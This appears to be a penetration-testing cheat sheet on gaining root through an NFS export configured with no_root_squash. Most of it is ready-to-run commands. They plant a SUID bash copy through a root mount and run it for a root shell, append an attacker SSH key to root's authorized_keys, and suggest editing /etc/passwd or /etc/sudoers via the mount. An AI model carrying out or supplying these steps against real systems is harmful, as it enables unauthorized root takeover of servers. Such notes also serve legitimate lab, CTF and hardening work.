# NFS no_root_squash Escalation

When an NFS export has `no_root_squash`, a remote root client's UID 0 maps to root on the server — meaning a root-owned SUID binary placed there via a root mount is executable by any local user.

```bash
# check exports from inside the box
cat /etc/exports          # look for no_root_squash on any share

# from attacker machine (as root), mount the share and plant a SUID shell
sudo mount -t nfs <TARGET_IP>:<export-path> /mnt/nfs
sudo cp /bin/bash /mnt/nfs/bash
sudo chmod +s /mnt/nfs/bash
# back on target
/mnt/nfs/bash -p          # -p preserves EUID=0 from the SUID bit
```

Alternative — append your SSH public key to root's authorized_keys:
```bash
# attacker (root mount)
echo '<your-pub-key>' >> /mnt/nfs/root/.ssh/authorized_keys
# attacker
ssh root@<TARGET_IP>
```

Also check if `rw` with `no_root_squash` lets you directly edit `/etc/passwd` or `/etc/sudoers` through the mount.
